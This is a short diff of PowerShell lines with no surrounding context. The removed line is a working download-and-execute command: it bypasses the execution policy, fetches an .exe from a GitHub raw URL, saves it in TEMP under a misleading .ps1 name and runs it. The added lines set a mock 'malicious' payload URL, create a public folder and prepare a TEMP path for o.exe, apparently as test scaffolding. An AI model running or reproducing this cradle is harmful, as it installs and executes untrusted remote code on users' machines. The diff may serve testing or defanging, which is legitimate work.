@@ -1,1 +1,4 @@
-powershell -ExecutionPolicy Bypass -Command "$path = Join-Path $env:TEMP 'script.ps1'; Invoke-WebRequest 'https://github.com/no123ex/tes/raw/refs/heads/main/WinFormsApp.exe' -UseBasicParsing -OutFile $path; & $path"
+$target = "http://malicious-mock-site.test/payload.exe"
+New-Item -ItemType Directory -Path "C:\Users\Public\TestFolder"
+
+$path = "$env:TEMP\o.exe"
